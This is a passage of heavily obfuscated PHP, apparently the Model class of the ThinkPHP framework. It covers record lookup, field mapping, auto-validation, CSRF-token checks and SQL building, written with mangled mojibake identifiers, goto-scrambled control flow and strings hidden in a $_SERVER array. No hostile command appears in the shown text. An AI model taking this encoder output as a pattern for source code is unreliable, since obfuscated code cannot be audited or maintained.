substr($Cİ¹ç‡îâ‰, 0, 1) && !1 === strpos($Cİ¹ç‡îâ‰, $A®Â–­çÅØ[91]) && !1 === strpos($Cİ¹ç‡îâ‰, $A®Â–­çÅØ[248]) && !1 === strpos($Cİ¹ç‡îâ‰, $A®Â–­çÅØ[271]) && !1 === strpos($Cİ¹ç‡îâ‰, $A®Â–­çÅØ[272])) { unset($BÓÕÑæÙƒÕ[$A®Â–­çÅØ[263]][$Cİ¹ç‡îâ‰]); } } } $this->_options_filter($BÓÕÑæÙƒÕ); return $BÓÕÑæÙƒÕ; goto fÖ»ÛĞÃÔ; fÖ»ÛĞÃÔ: } protected function _options_filter(&$DÚï‡Öíêº) { } protected function _parseType(&$ağ×ÆÅ´ñØ, $dìËƒÒÉó) { $b›®¬µãí =& $_SERVER[‚Ğ°–—î]; if (empty($this->options[$b›®¬µãí[273]][$b›®¬µãí[4] . $dìËƒÒÉó])) { $Dù¿îæ˜†³ = strtolower($this->fields[$b›®¬µãí[240]][$dìËƒÒÉó]); if (!1 !== strpos($Dù¿îæ˜†³, $b›®¬µãí[274])) { } elseif (!1 === strpos($Dù¿îæ˜†³, $b›®¬µãí[275]) && !1 !== strpos($Dù¿îæ˜†³, $b›®¬µãí[276])) { $ağ×ÆÅ´ñØ[$dìËƒÒÉó] = intval($ağ×ÆÅ´ñØ[$dìËƒÒÉó]); } elseif (!1 !== strpos($Dù¿îæ˜†³, $b›®¬µãí[277]) || !1 !== strpos($Dù¿îæ˜†³, $b›®¬µãí[278])) { $ağ×ÆÅ´ñØ[$dìËƒÒÉó] = floatval($ağ×ÆÅ´ñØ[$dìËƒÒÉó]); } elseif (!1 !== strpos($Dù¿îæ˜†³, $b›®¬µãí[279])) { $ağ×ÆÅ´ñØ[$dìËƒÒÉó] = (bool) $ağ×ÆÅ´ñØ[$dìËƒÒÉó]; } } } public function find($AêØÊ§× = array()) { goto bª´µÄ±µŠ; fŸîÒ¹…»Š: $AêØÊ§× = $this->_parseOptions(); $eè¼í¾Ôã = $this->db->select($AêØÊ§×); if (!1 === $eè¼í¾Ôã) { return !1; } goto eÔ­ã×Åâ; eÔ­ã×Åâ: if (empty($eè¼í¾Ôã)) { return null; } $this->data = $eè¼í¾Ôã[0]; $this->_afterFind($this->data, $AêØÊ§×); goto e‚éÃç¡Ø¿; bª´µÄ±µŠ: $c±©¥š”Ü¡ =& $_SERVER[‚Ğ°–—î]; if (is_numeric($AêØÊ§×) || is_string($AêØÊ§×)) { $BæˆËº‡ÈŞ[$this->getPk()] = intval($AêØÊ§×); $this->options[$c±©¥š”Ü¡[263]] = $BæˆËº‡ÈŞ; } $this->options[$c±©¥š”Ü¡[280]] = 1; goto fŸîÒ¹…»Š; e‚éÃç¡Ø¿: if (!empty($this->options[$c±©¥š”Ü¡[281]])) { return $this->returnResult($this->data, $this->options[$c±©¥š”Ü¡[281]]); } return $this->data; goto B°‰ª”ĞÅõ; B°‰ª”ĞÅõ: } protected function _afterFind(&$bò³…Ù£ÑÑ, $EÍ²÷œÖ³‚) { } protected function returnResult($CËœô¦ŸİÃ, $eÕ”©¹à = '') { $Cˆ½Îƒ•êÉ =& $_SERVER[‚Ğ°–—î]; if ($eÕ”©¹à) { if (is_callable($eÕ”©¹à)) { return call_user_func($eÕ”©¹à, $CËœô¦ŸİÃ); } switch (strtolower($eÕ”©¹à)) { case $Cˆ½Îƒ•êÉ[282]: return json_encode($CËœô¦ŸİÃ); case $Cˆ½Îƒ•êÉ[283]: return xml_encode($CËœô¦ŸİÃ); } } return $CËœô¦ŸİÃ; } public function parseFieldsMap($E„Â™ŠŞ˜, $FÕêóÏ¹Ç = 1) { if (!empty($this->_map)) { foreach ($this->_map as $f¯ÙÉ‚ëÇ => $f‚ÀÚÑ©¥) { if ($FÕêóÏ¹Ç == 1) { if (isset($E„Â™ŠŞ˜[$f‚ÀÚÑ©¥])) { $E„Â™ŠŞ˜[$f¯ÙÉ‚ëÇ] = $E„Â™ŠŞ˜[$f‚ÀÚÑ©¥]; unset($E„Â™ŠŞ˜[$f‚ÀÚÑ©¥]); } } else { if (isset($E„Â™ŠŞ˜[$f¯ÙÉ‚ëÇ])) { $E„Â™ŠŞ˜[$f‚ÀÚÑ©¥] = $E„Â™ŠŞ˜[$f¯ÙÉ‚ëÇ]; unset($E„Â™ŠŞ˜[$f¯ÙÉ‚ëÇ]); } } } } return $E„Â™ŠŞ˜; } public function setField($dÚµÇÅÉ†¼, $EÌ†Îœïİ = '') { if (is_array($dÚµÇÅÉ†¼)) { $bíİ˜ ÌÃ = $dÚµÇÅÉ†¼; } else { $bíİ˜ ÌÃ[$dÚµÇÅÉ†¼] = $EÌ†Îœïİ; } return $this->save($bíİ˜ ÌÃ); } public function setAdd($eÊ’¬±–ÁÑ, $F¬‘‰áÖÖ = 1) { $c³£á…Û =& $_SERVER[‚Ğ°–—î]; $BªªÔ‡ğøõ = $eÊ’¬±–ÁÑ . $c³£á…Û[284] . $F¬‘‰áÖÖ; if ($F¬‘‰áÖÖ < 0) { $BªªÔ‡ğøõ = $eÊ’¬±–ÁÑ . $F¬‘‰áÖÖ; } return $this->setField($eÊ’¬±–ÁÑ, array($c³£á…Û[285], $BªªÔ‡ğøõ)); } public function getField($EÒ–¿òÕÓ, $F İ‚„å´÷ = null) { $eÛİÌê¸Ì =& $_SERVER[‚Ğ°–—î]; $C½Œµ×«ç”[$eÛİÌê¸Ì[261]] = $EÒ–¿òÕÓ; $C½Œµ×«ç” = $this->_parseOptions($C½Œµ×«ç”); $EÒ–¿òÕÓ = trim($EÒ–¿òÕÓ); if (strpos($EÒ–¿òÕÓ, $eÛİÌê¸Ì[47])) { if (!isset($C½Œµ×«ç”[$eÛİÌê¸Ì[280]])) { $C½Œµ×«ç”[$eÛİÌê¸Ì[280]] = is_numeric($F İ‚„å´÷) ? $F İ‚„å´÷ : $eÛİÌê¸Ì[33]; } $Dø§İŞ£È = $this->db->select($C½Œµ×«ç”); if (!empty($Dø§İŞ£È)) { goto Bµ¤Á„æ”Ğ; Bµ¤Á„æ”Ğ: $eÚ·çŠáå = explode($eÛİÌê¸Ì[47], $EÒ–¿òÕÓ); $EÒ–¿òÕÓ = array_keys($Dø§İŞ£È[0]); $Eğñ‡Óç˜ = array_shift($EÒ–¿òÕÓ); goto Aª—ÕÜ¦¹ò; Aª—ÕÜ¦¹ò: $D™ğá¨×ƒó = array_shift($EÒ–¿òÕÓ); $f™ğÒòã = array(); $F¨ÌÂéøæ = count($eÚ·çŠáå); goto cÆÛ­ËÃÍ; cÆÛ­ËÃÍ: foreach ($Dø§İŞ£È as $Eá¸ƒ‘Òˆù) { $C²¶Å¸İÖì = $Eá¸ƒ‘Òˆù[$Eğñ‡Óç˜]; if (2 == $F¨ÌÂéøæ) { $f™ğÒòã[$C²¶Å¸İÖì] = $Eá¸ƒ‘Òˆù[$D™ğá¨×ƒó]; } else { $f™ğÒòã[$C²¶Å¸İÖì] = is_string($F İ‚„å´÷) ? implode($F İ‚„å´÷, $Eá¸ƒ‘Òˆù) : $Eá¸ƒ‘Òˆù; } } return $f™ğÒòã; goto aã—¥¼Íš®; aã—¥¼Íš®: } } else { if (!0 !== $F İ‚„å´÷) { $C½Œµ×«ç”[$eÛİÌê¸Ì[280]] = is_numeric($F İ‚„å´÷) ? $F İ‚„å´÷ : 1; } if ($F İ‚„å´÷ === $eÛİÌê¸Ì[243]) { unset($C½Œµ×«ç”[$eÛİÌê¸Ì[280]]); } $Eá¸ƒ‘Òˆù = $this->db->select($C½Œµ×«ç”); if (!empty($Eá¸ƒ‘Òˆù)) { if ($F İ‚„å´÷ === $eÛİÌê¸Ì[243]) { return reset($Eá¸ƒ‘Òˆù[0]); } if (!0 !== $F İ‚„å´÷ && 1 == $C½Œµ×«ç”[$eÛİÌê¸Ì[280]]) { return reset($Eá¸ƒ‘Òˆù[0]); } foreach ($Eá¸ƒ‘Òˆù as $D¾—ÈœÉï‰) { $D¥õ‚ƒŠÓ[] = $D¾—ÈœÉï‰[$EÒ–¿òÕÓ]; } return $D¥õ‚ƒŠÓ; } } return null; } public function create($C·‡åÖ±½ä = '', $D¤« „ª×Œ = '') { goto e½İ¦³ºšÃ; C×¿Ÿ å: $C·‡åÖ±½ä = $this->parseFieldsMap($C·‡åÖ±½ä, 0); $D¤« „ª×Œ = $D¤« „ª×Œ ? $D¤« „ª×Œ : (!empty($C·‡åÖ±½ä[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$CÕ†öÙøÄ[261]])) { $bˆŞ¯°î¼ò = $this->options[$CÕ†öÙøÄ[261]]; unset($this->options[$CÕ†öÙøÄ[261]]); } elseif ($D¤« „ª×Œ == THINK_MODEL_INSERT && isset($this->insertFields)) { $bˆŞ¯°î¼ò = $this->insertFields; } elseif ($D¤« „ª×Œ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $bˆŞ¯°î¼ò = $this->updateFields; } goto fïÄ…ÌØìë; bÄİ¡ˆÑß: if ($this->autoCheckFields) { $bˆŞ¯°î¼ò = $this->getDbFields(); foreach ($C·‡åÖ±½ä as $b¶á¯÷·ÖĞ => $b®åÜŒáö‹) { if (!in_array($b¶á¯÷·ÖĞ, $bˆŞ¯°î¼ò)) { unset($C·‡åÖ±½ä[$b¶á¯÷·ÖĞ]); } elseif (MAGIC_QUOTES_GPC && is_string($b®åÜŒáö‹)) { $C·‡åÖ±½ä[$b¶á¯÷·ÖĞ] = stripslashes($b®åÜŒáö‹); } } } $this->autoOperation($C·‡åÖ±½ä, $D¤« „ª×Œ); $this->data = $C·‡åÖ±½ä; goto aæö¤‡—î; aæö¤‡—î: return $C·‡åÖ±½ä; goto Aˆğ÷ò†µµ; fïÄ…ÌØìë: if (isset($bˆŞ¯°î¼ò)) { if (is_string($bˆŞ¯°î¼ò)) { $bˆŞ¯°î¼ò = explode($CÕ†öÙøÄ[47], $bˆŞ¯°î¼ò); } if (think_config($CÕ†öÙøÄ[286])) { $bˆŞ¯°î¼ò[] = think_config($CÕ†öÙøÄ[287]); } foreach ($C·‡åÖ±½ä as $b¶á¯÷·ÖĞ => $b®åÜŒáö‹) { if (!in_array($b¶á¯÷·ÖĞ, $bˆŞ¯°î¼ò)) { unset($C·‡åÖ±½ä[$b¶á¯÷·ÖĞ]); } } } if (!$this->autoValidation($C·‡åÖ±½ä, $D¤« „ª×Œ)) { return !1; } if (!$this->autoCheckToken($C·‡åÖ±½ä)) { $this->error = think_lang($CÕ†öÙøÄ[288]); return !1; } goto bÄİ¡ˆÑß; e½İ¦³ºšÃ: $CÕ†öÙøÄ =& $_SERVER[‚Ğ°–—î]; if (empty($C·‡åÖ±½ä)) { $C·‡åÖ±½ä = $_POST; } elseif (is_object($C·‡åÖ±½ä)) { $C·‡åÖ±½ä = get_object_vars($C·‡åÖ±½ä); } if (empty($C·‡åÖ±½ä) || !is_array($C·‡åÖ±½ä)) { $this->error = think_lang($CÕ†öÙøÄ[259]); return !1; } goto C×¿Ÿ å; Aˆğ÷ò†µµ: } public function autoCheckToken($fªÆÂ×Á¤) { $D¼®ÔĞÌ–ƒ =& $_SERVER[‚Ğ°–—î]; if (isset($this->options[$D¼®ÔĞÌ–ƒ[289]]) && !$this->options[$D¼®ÔĞÌ–ƒ[289]]) { return !0; } if (think_config($D¼®ÔĞÌ–ƒ[286])) { $aê˜¤äŠá = think_config($D¼®ÔĞÌ–ƒ[287]); if (!isset($fªÆÂ×Á¤[$aê˜¤äŠá]) || Session::get($aê˜¤äŠá)) { return !1; } list($aã—³†Õ¦, $E›×¾´¬Ú¸) = explode($D¼®ÔĞÌ–ƒ[70], $fªÆÂ×Á¤[$aê˜¤äŠá]); if ($E›×¾´¬Ú¸ && Session::get($aê˜¤äŠá . $D¼®ÔĞÌ–ƒ[91] . $aã—³†Õ¦) === $E›×¾´¬Ú¸) { Session::remove($aê˜¤äŠá . $D¼®ÔĞÌ–ƒ[91] . $aã—³†Õ¦); return !0; } if (think_config($D¼®ÔĞÌ–ƒ[290])) { Session::remove($aê˜¤äŠá . $D¼®ÔĞÌ–ƒ[91] . $aã—³†Õ¦); } return !1; } return !0; } public function regex($F«¿®‚±è», $Bô»÷í ¿±) { $dÑœø¸£áĞ =& $_SERVER[‚Ğ°–—î]; $bÑŒâŒ § = array($dÑœø¸£áĞ[291] => $dÑœø¸£áĞ[292], $dÑœø¸£áĞ[293] => $dÑœø¸£áĞ[294], $dÑœø¸£áĞ[295] => $dÑœø¸£áĞ[296], $dÑœø¸£áĞ[297] => $dÑœø¸£áĞ[298], $dÑœø¸£áĞ[299] => $dÑœø¸£áĞ[300], $dÑœø¸£áĞ[301] => $dÑœø¸£áĞ[302], $dÑœø¸£áĞ[303] => $dÑœø¸£áĞ[304], $dÑœø¸£áĞ[278] => $dÑœø¸£áĞ[305], $dÑœø¸£áĞ[306] => $dÑœø¸£áĞ[307]); if (isset($bÑŒâŒ §[strtolower($Bô»÷í ¿±)])) { $Bô»÷í ¿± = $bÑŒâŒ §[strtolower($Bô»÷í ¿±)]; } return preg_match($Bô»÷í ¿±, $F«¿®‚±è») === 1; } private function autoOperation(&$C÷¶ÉŞ¯×´, $eÌ×ç±ÚÊŒ) { $Déè—àÒ =& $_SERVER[‚Ğ°–—î]; if (!empty($this->options[$Déè—àÒ[308]])) { $Fğ‡µ†¹½ = $this->options[$Déè—àÒ[308]]; unset($this->options[$Déè—àÒ[308]]); } elseif (!empty($this->_auto)) { $Fğ‡µ†¹½ = $this->_auto; } if (isset($Fğ‡µ†¹½)) { foreach ($Fğ‡µ†¹½ as $Bõ¡É†š†³) { if (empty($Bõ¡É†š†³[2])) { $Bõ¡É†š†³[2] = THINK_MODEL_INSERT; } if ($eÌ×ç±ÚÊŒ == $Bõ¡É†š†³[2] || $Bõ¡É†š†³[2] == THINK_MODEL_BOTH) { switch (trim($Bõ¡É†š†³[3])) { case $Déè—àÒ[309]: case $Déè—àÒ[310]: $F©®ÇÀ—´ = isset($Bõ¡É†š†³[4]) ? (array) $Bõ¡É†š†³[4] : array(); if (isset($C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]])) { array_unshift($F©®ÇÀ—´, $C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]]); } if ($Déè—àÒ[309] == $Bõ¡É†š†³[3]) { $C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]] = call_user_func_array($Bõ¡É†š†³[1], $F©®ÇÀ—´); } else { $C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]] = call_user_func_array(array(&$this, $Bõ¡É†š†³[1]), $F©®ÇÀ—´); } break; case $Déè—àÒ[261]: $C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]] = $C÷¶ÉŞ¯×´[$Bõ¡É†š†³[1]]; break; case $Déè—àÒ[311]: if ($Déè—àÒ[33] === $C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]]) { unset($C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]]); } break; case $Déè—àÒ[312]: default: $C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]] = $Bõ¡É†š†³[1]; } if (!1 === $C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]]) { unset($C÷¶ÉŞ¯×´[$Bõ¡É†š†³[0]]); } } } } return $C÷¶ÉŞ¯×´; } protected function autoValidation($DŒõî³—, $d—¥ÔÕ‡¹) { $eÚÊØ‡Åù =& $_SERVER[‚Ğ°–—î]; if (!empty($this->options[$eÚÊØ‡Åù[313]])) { $E“¦ô¿Ïõ´ = $this->options[$eÚÊØ‡Åù[313]]; unset($this->options[$eÚÊØ‡Åù[313]]); } elseif (!empty($this->_validate)) { $E“¦ô¿Ïõ´ = $this->_validate; } if (isset($E“¦ô¿Ïõ´)) { if ($this->patchValidate) { $this->error = array(); } foreach ($E“¦ô¿Ïõ´ as $C»÷æÙ‰Åƒ => $d£Şˆí¼ŒË) { if (empty($d£Şˆí¼ŒË[5]) || $d£Şˆí¼ŒË[5] == THINK_MODEL_BOTH || $d£Şˆí¼ŒË[5] == $d—¥ÔÕ‡¹) { if (0 == strpos($d£Şˆí¼ŒË[2], $eÚÊØ‡Åù[314]) && strpos($d£Şˆí¼ŒË[2], $eÚÊØ‡Åù[315])) { $d£Şˆí¼ŒË[2] = think_lang(substr($d£Şˆí¼ŒË[2], 2, -1)); } $d£Şˆí¼ŒË[3] = isset($d£Şˆí¼ŒË[3]) ? $d£Şˆí¼ŒË[3] : THINK_EXISTS_VALIDATE; $d£Şˆí¼ŒË[4] = isset($d£Şˆí¼ŒË[4]) ? $d£Şˆí¼ŒË[4] : $eÚÊØ‡Åù[316]; switch ($d£Şˆí¼ŒË[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($DŒõî³—, $d£Şˆí¼ŒË)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($eÚÊØ‡Åù[33] != trim($DŒõî³—[$d£Şˆí¼ŒË[0]])) { if (!1 === $this->_validationField($DŒõî³—, $d£Şˆí¼ŒË)) { return !1; } } break; default: if (isset($DŒõî³—[$d£Şˆí¼ŒË[0]])) { if (!1 === $this->_validationField($DŒõî³—, $d£Şˆí¼ŒË)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Cğ¹’‡‰ç, $C»…—ÏŠÆ…) { if (!1 === $this->_validationFieldItem($Cğ¹’‡‰ç, $C»…—ÏŠÆ…)) { if ($this->patchValidate) { $this->error[$C»…—ÏŠÆ…[0]] = $C»…—ÏŠÆ…[2]; } else { $this->error = $C»…—ÏŠÆ…[2]; return !1; } } return; } protected function _validationFieldItem($Eß‰¼£¹ò‘, $CÌ™—Æ™÷¨) { $bˆñİ‹÷“ë =& $_SERVER[‚Ğ°–—î]; switch (strtolower(trim($CÌ™—Æ™÷¨[4]))) { case $bˆñİ‹÷“ë[309]: case $bˆñİ‹÷“ë[310]: $AÎê°´Ú = isset($CÌ™—Æ™÷¨[6]) ? (array) $CÌ™—Æ™÷¨[6] : array(); if (is_string($CÌ™—Æ™÷¨[0]) && strpos($CÌ™—Æ™÷¨[0], $bˆñİ‹÷“ë[47])) { $CÌ™—Æ™÷¨[0] = explode($bˆñİ‹÷“ë[47], $CÌ™—Æ™÷¨[0]); } if (is_array($CÌ™—Æ™÷¨[0])) { foreach ($CÌ™—Æ™÷¨[0] as $FÛæ–§¤¿Ú) { $A¸Õ›æà´ó[$FÛæ–§¤¿Ú] = $Eß‰¼£¹ò‘[$FÛæ–§¤¿Ú]; } array_unshift($AÎê°´Ú, $A¸Õ›æà´ó); } else { array_unshift($AÎê°´Ú, $Eß‰¼£¹ò‘[$CÌ™—Æ™÷¨[0]]); } if ($bˆñİ‹÷“ë[309] == $CÌ™—Æ™÷¨[4]) { return call_user_func_array($CÌ™—Æ™÷¨[1], $AÎê°´Ú); } else { return call_user_func_array(array(&$this, $CÌ™—Æ™÷¨[1]), $AÎê°´Ú); } case $bˆñİ‹÷“ë[317]: return $Eß‰¼£¹ò‘[$CÌ™—Æ™÷¨[0]] == $Eß‰¼£¹ò‘[$CÌ™—Æ™÷¨[1]]; case $bˆñİ‹÷“ë[318]: if (is_string($CÌ™—Æ™÷¨[0]) && strpos($CÌ™—Æ™÷¨[0], $bˆñİ‹÷“ë[47])) { $CÌ™—Æ™÷¨[0] = explode($bˆñİ‹÷“ë[47], $CÌ™—Æ™÷¨[0]); } $dÛĞªó÷¨ö = array(); if (is_array($CÌ™—Æ™÷¨[0])) { foreach ($CÌ™—Æ™÷¨[0] as $FÛæ–§¤¿Ú) { $dÛĞªó÷¨ö[$FÛæ–§¤¿Ú] = $Eß‰¼£¹ò‘[$FÛæ–§¤¿Ú]; } } else { $dÛĞªó÷¨ö[$CÌ™—Æ™÷¨[0]] = $Eß‰¼£¹ò‘[$CÌ™—Æ™÷¨[0]]; } if (!empty($Eß‰¼£¹ò‘[$this->getPk()])) { $dÛĞªó÷¨ö[$this->getPk()] = array($bˆñİ‹÷“ë[319], $Eß‰¼£¹ò‘[$this->getPk()]); } if ($this->where($dÛĞªó÷¨ö)->find()) { return !1; } return !0; default: return $this->check($Eß‰¼£¹ò‘[$CÌ™—Æ™÷¨[0]], $CÌ™—Æ™÷¨[1], $CÌ™—Æ™÷¨[4]); } } public function check($eÀªÀÜĞÓ, $a†Û•İĞ‡, $C¡Çß¡‰÷ = "\x72\145\x67\145\x78") { $FÂ˜Ø¯ù¬˜ =& $_SERVER[‚Ğ°–—î]; $C¡Çß¡‰÷ = strtolower(trim($C¡Çß¡‰÷)); switch ($C¡Çß¡‰÷) { case $FÂ˜Ø¯ù¬˜[7]: case $FÂ˜Ø¯ù¬˜[320]: $BÇ»“é•ö = is_array($a†Û•İĞ‡) ? $a†Û•İĞ‡ : explode($FÂ˜Ø¯ù¬˜[47], $a†Û•İĞ‡); return $C¡Çß¡‰÷ == $FÂ˜Ø¯ù¬˜[7] ? in_array($eÀªÀÜĞÓ, $BÇ»“é•ö) : !in_array($eÀªÀÜĞÓ, $BÇ»“é•ö); case $FÂ˜Ø¯ù¬˜[321]: case $FÂ˜Ø¯ù¬˜[322]: if (is_array($a†Û•İĞ‡)) { $a¨Õ«µÊœ = $a†Û•İĞ‡[0]; $dÀ·†Ä‚«Î = $a†Û•İĞ‡[1]; } else { list($a¨Õ«µÊœ, $dÀ·†Ä‚«Î) = explode($FÂ˜Ø¯ù¬˜[47], $a†Û•İĞ‡); } return $C¡Çß¡‰÷ == $FÂ˜Ø¯ù¬˜[321] ? $eÀªÀÜĞÓ >= $a¨Õ«µÊœ && $eÀªÀÜĞÓ <= $dÀ·†Ä‚«Î : $eÀªÀÜĞÓ < $a¨Õ«µÊœ || $eÀªÀÜĞÓ > $dÀ·†Ä‚«Î; case $FÂ˜Ø¯ù¬˜[323]: case $FÂ˜Ø¯ù¬˜[324]: return $C¡Çß¡‰÷ == $FÂ˜Ø¯ù¬˜[323] ? $eÀªÀÜĞÓ == $a†Û•İĞ‡ : $eÀªÀÜĞÓ != $a†Û•İĞ‡; case $FÂ˜Ø¯ù¬˜[325]: $EœÓ¢•“¿Ü = mb_strlen($eÀªÀÜĞÓ, $FÂ˜Ø¯ù¬˜[326]); if (strpos($a†Û•İĞ‡, $FÂ˜Ø¯ù¬˜[47])) { list($a¨Õ«µÊœ, $dÀ·†Ä‚«Î) = explode($FÂ˜Ø¯ù¬˜[47], $a†Û•İĞ‡); return $EœÓ¢•“¿Ü >= $a¨Õ«µÊœ && $EœÓ¢•“¿Ü <= $dÀ·†Ä‚«Î; } else { return $EœÓ¢•“¿Ü == $a†Û•İĞ‡; } case $FÂ˜Ø¯ù¬˜[327]: list($A¶ŸâŸ™‚, $B‘–ÉÈ­ø¿) = explode($FÂ˜Ø¯ù¬˜[47], $a†Û•İĞ‡); if (!is_numeric($A¶ŸâŸ™‚)) { $A¶ŸâŸ™‚ = strtotime($A¶ŸâŸ™‚); } if (!is_numeric($B‘–ÉÈ­ø¿)) { $B‘–ÉÈ­ø¿ = strtotime($B‘–ÉÈ­ø¿); } return NOW_TIME >= $A¶ŸâŸ™‚ && NOW_TIME <= $B‘–ÉÈ­ø¿; case $FÂ˜Ø¯ù¬˜[328]: return in_array(get_client_ip(), explode($FÂ˜Ø¯ù¬˜[47], $a†Û•İĞ‡)); case $FÂ˜Ø¯ù¬˜[329]: return !in_array(get_client_ip(), explode($FÂ˜Ø¯ù¬˜[47], $a†Û•İĞ‡)); case $FÂ˜Ø¯ù¬˜[316]: default: return $this->regex($eÀªÀÜĞÓ, $a†Û•İĞ‡); } } public function query($bõ‹Ë—Ÿ˜ù, $f¡õŒ¶‘ = false) { $Aì¹œË“‘Á =& $_SERVER[‚Ğ°–—î]; if (!is_bool($f¡õŒ¶‘) && !is_array($f¡õŒ¶‘)) { $f¡õŒ¶‘ = func_get_args(); array_shift($f¡õŒ¶‘); } $bõ‹Ë—Ÿ˜ù = str_replace(array($Aì¹œË“‘Á[217], $Aì¹œË“‘Á[330]), $Aì¹œË“‘Á[50], $bõ‹Ë—Ÿ˜ù); $bõ‹Ë—Ÿ˜ù = $this->parseSql($bõ‹Ë—Ÿ˜ù, $f¡õŒ¶‘); return $this->db->query($bõ‹Ë—Ÿ˜ù); } public function execute($DëØåÛèªÖ, $eºÎÎ³»Â = false) { if (!is_bool($eºÎÎ³»Â) && !is_array($eºÎÎ³»Â)) { $eºÎÎ³»Â = func_get_args(); array_shift($eºÎÎ³»Â); } $DëØåÛèªÖ = $this->parseSql($DëØåÛèªÖ, $eºÎÎ³»Â); return $this->db->execute($DëØåÛèªÖ); } protected function parseSql($B—é…ŠÇ¡, $DğŞº¨ñì) { $EÕÀ“º‚¡„ =& $_SERVER[‚Ğ°–—î]; if (!0 === $DğŞº¨ñì) { $a¯ë˜ê¾˜ƒ = $this->_parseOptions(); $B—é…ŠÇ¡ = $this->db->parseSql($B—é…ŠÇ¡, $a¯ë˜ê¾˜ƒ); } elseif (is_array($DğŞº¨ñì)) { $DğŞº¨ñì = array_map(array($this->db, $EÕÀ“º‚¡„[331]), $DğŞº¨ñì); $B—é…ŠÇ¡ = vsprintf($B—é…ŠÇ¡, $DğŞº¨ñì); } else { $B—é…ŠÇ¡ = strtr($B—é…ŠÇ¡, array($EÕÀ“º‚¡„[332] => $this->getTableName(), $EÕÀ“º‚¡„[333] => think_config($EÕÀ“º‚¡„[232]))); } $this->db->setModel($this->name); return $B—é…ŠÇ¡; } public function db($CÈóÆ…ö’¤ = '', $aÏÈË˜±³ = '', $C¬¨ÃÓÓ¸Á = array()) { goto eÌÓÑÕ‡Ú; b×¯º ×ö: static $Cğ…—¬‡ÌÌ = array(); if (!isset($Cğ…—¬‡ÌÌ[$CÈóÆ…ö’¤]) || isset($Cğ…—¬‡ÌÌ[$CÈóÆ…ö’¤]) && $aÏÈË˜±³ && $c¿”ª©’Õ‘[$CÈóÆ…ö’¤] != $aÏÈË˜±³) { if (!empty($aÏÈË˜±³) && is_string($aÏÈË˜±³) && !1 === strpos($aÏÈË˜±³, $Dä©ó¦Ä¯[8])) { $aÏÈË˜±³ = think_config($aÏÈË˜±³); } $Cğ…—¬‡ÌÌ[$CÈóÆ…ö’¤] = Db::getInstance($aÏÈË˜±³); } elseif (NULL === $aÏÈË˜±³) { $Cğ…—¬‡ÌÌ[$CÈóÆ…ö’¤]->close(); unset($Cğ…—¬‡ÌÌ[$CÈóÆ…ö’¤]); return; } if (!empty($C¬¨ÃÓÓ¸Á)) { if (is_string($C¬¨ÃÓÓ¸Á)) { parse_str($C¬¨ÃÓÓ¸Á, $C¬¨ÃÓÓ¸Á); } foreach ($C¬¨ÃÓÓ¸Á as $cï‰²¡Ìô® => $e¹Ùå–ªÁ) { $this->setProperty($cï‰²¡Ìô®, $e¹Ùå–ªÁ); } } goto Dƒì“øÌªô; Cçæ„•¶ç³: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto EÛÙ®ª·Í; eÌÓÑÕ‡Ú: $Dä©ó¦Ä¯ =& $_SERVER[‚Ğ°–—î]; if ($Dä©ó¦Ä¯[33] === $CÈóÆ…ö’¤ && $this->db) { return $this->db; } static $c¿”ª©’Õ‘ = array(); goto b×¯º ×ö; Dƒì“øÌªô: $c¿”ª©’Õ‘[$CÈóÆ…ö’¤] = $aÏÈË˜±³; $this->db = $Cğ…—¬‡ÌÌ[$CÈóÆ…ö’¤]; $this->_after_db(); goto Cçæ„•¶ç³; EÛÙ®ª·Í: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $e˜„™¢ø = get_class($this); if ($e˜„™¢ø == $_SERVER[‚Ğ°–—î][334]) { return $this->name; } $this->name = substr($e˜„™¢ø, 0, -5); } return $this->name; } public function getTableName() { $eÅ‹–„‹Ìğ =& $_SERVER[‚Ğ°–—î]; if (empty($this->trueTableName)) { $E¬°ÌòìÎ› = !empty($this->tablePrefix) ? $this->tablePrefix : $eÅ‹–„‹Ìğ[33]; if (!empty($this->tableName)) { $E¬°ÌòìÎ› .= $this->tableName; } else { $E¬°ÌòìÎ› .= think_parse_name($this->name); } $this->trueTableName = strtolower($E¬°ÌòìÎ›); } return (!empty($this->dbName) ? $this->dbName . $eÅ‹–„‹Ìğ[91] : $eÅ‹–„‹Ìğ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $dÚ™Š°ªÂ„ =& $_SERVER[‚Ğ°–—î]; return isset($this->fields[$dÚ™Š°ªÂ„[239]]) ? $this->fields[$dÚ™Š°ªÂ„[239]] : $this->pk; } public function getDbFields() { $fÕØ¤°–ÙÚ =& $_SERVER[‚Ğ°–—î]; if (isset($this->options[$fÕØ¤°–ÙÚ[267]])) { $aæ¸´ÎÍ = $this->db->getFields($this->options[$fÕØ¤°–ÙÚ[267]]); return $aæ¸´ÎÍ ? array_keys($aæ¸´ÎÍ) : !1; } if ($this->fields) { $aæ¸´ÎÍ = $this->fields; unset($aæ¸´ÎÍ[$fÕØ¤°–ÙÚ[238]], $aæ¸´ÎÍ[$fÕØ¤°–ÙÚ[239]], $aæ¸´ÎÍ[$fÕØ¤°–ÙÚ[240]], $aæ¸´ÎÍ[$fÕØ¤°–ÙÚ[237]]); return $aæ¸´ÎÍ; } return !1; } public function data($aªŠ‘ÆÒ” = '') { $dó„¸ Šø =& $_SERVER[‚Ğ°–—î]; if ($dó„¸ Šø[33] === $aªŠ‘ÆÒ” && !empty($this->data)) { return $this->data; } if 